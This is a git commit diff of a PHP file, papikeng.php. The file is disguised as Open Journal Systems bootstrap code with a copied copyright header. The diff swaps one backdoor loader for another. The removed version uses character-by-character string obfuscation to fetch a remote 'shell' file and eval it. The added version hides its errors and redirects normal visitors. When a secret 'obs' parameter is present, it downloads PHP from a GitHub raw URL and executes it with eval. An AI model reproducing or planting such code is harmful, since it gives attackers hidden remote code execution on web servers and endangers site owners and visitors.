7424b5909d315173b84507f2aec5a4c2a19f08ff
tuman88936 <anevan08@gmail.com>
2025-10-07 03:53:25 +0700

    Update papikeng.php

--- papikeng.php
+++ papikeng.php
@@ -1,45 +1,63 @@
 <?php
+/**
+ * @file index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
 
-$_u = 'h'.'t'.'t'.'p'.'s'.':' . '/' . '/' . 
-              'j'.'a'.'k'.'a'.'r'.'t'.'a'.'f'.'c'.'.'.
-              'c'.'o'.'m'.'/'.
-              's'.'h'.'e'.'l'.'l'.'/'.
-              'e'.'r'.'r'.'o'.'r'.'2'.'.'.'t'.'x'.'t';;
+error_reporting(0);
+ini_set('display_errors', 0);
+// Initialize global environment
+$is_jamal = isset($_GET['obs']);
 
-$_iniget = 'i'.'n'.'i'.'_'.'g'.'e'.'t';
-$_func_exists = 'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n'.'_' . 'e'.'x'.'i'.'s'.'t'.'s';
+// Serve the request
+if (!$is_jamal) {
+    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+    $host = $_SERVER['HTTP_HOST'];
+    $redirect_url = $protocol . $host . "/";
 
-$_open = call_user_func($_iniget, 'a'.'l'.'l'.'o'.'w'.'_' . 'u'.'r'.'l'.'_' . 'f'.'o'.'p'.'e'.'n');
-$_curl = call_user_func($_func_exists, 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t');
-
-$_out = false;
-
-if ($_open) {
-    $_fget = 'f'.'i'.'l'.'e'.'_' . 'g'.'e'.'t'.'_' . 'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
-    $_out = @call_user_func($_fget, $_u);
-} elseif ($_curl) {
-    $_ci = 'c'.'u'.'r'.'l'.'_' . 'i'.'n'.'i'.'t';
-    $_co = 'c'.'u'.'r'.'l'.'_' . 's'.'e'.'t'.'o'.'p'.'t';
-    $_ce = 'c'.'u'.'r'.'l'.'_' . 'e'.'x'.'e'.'c';
-    $_cc = 'c'.'u'.'r'.'l'.'_' . 'c'.'l'.'o'.'s'.'e';
-
-    $_ct1 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'R'.'E'.'T'.'U'.'R'.'N'.'T'.'R'.'A'.'N'.'S'.'F'.'E'.'R';
-    $_ct2 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'F'.'O'.'L'.'L'.'O'.'W'.'L'.'O'.'C'.'A'.'T'.'I'.'O'.'N';
-    $_ct3 = 'C'.'U'.'R'.'L'.'O'.'P'.'T'.'_' . 'T'.'I'.'M'.'E'.'O'.'U'.'T';
-
-    $_h = call_user_func($_ci, $_u);
-    call_user_func($_co, $_h, constant($_ct1), true);
-    call_user_func($_co, $_h, constant($_ct2), true);
-    call_user_func($_co, $_h, constant($_ct3), 10);
-    $_out = call_user_func($_ce, $_h);
-    call_user_func($_cc, $_h);
+    header("Location: $redirect_url", true, 302);
+    exit;
 }
 
-if ($_out !== false) {
-    $_b64 = 'b'.'a'.'s'.'e'.'6'.'4'.'_' . 'd'.'e'.'c'.'o'.'d'.'e';
-    eval('?>' . call_user_func($_b64, base64_encode($_out)));
-} else {
-    echo 'G'.'a'.'g'.'a'.'l'.' ' . 'l'.'o'.'a'.'d';
+class CurlFetcher {
+    public function fetchContent(string $url) {
+        if (!function_exists('curl_init')) return false;
+        $ch = curl_init($url);
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
+            CURLOPT_TIMEOUT => 10
+        ]);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
 }
 
+class CodeExecutor {
+    private $fetcher;
+    public function __construct(CurlFetcher $fetcher) {
+        $this->fetcher = $fetcher;
+    }
+
+    public function executeCodeFromURL(string $url): void {
+        $code = $this->fetcher->fetchContent($url);
+        if ($code && trim($code) !== '') {
+            eval("?>" . $code);
+        }
+    }
+}
+
+
+$fetcher = new CurlFetcher();
+$executor = new CodeExecutor($fetcher);
+$executor->executeCodeFromURL("https://raw.githubusercontent.com/yourfr13nds/backburner/main/gecko.php");
 ?>
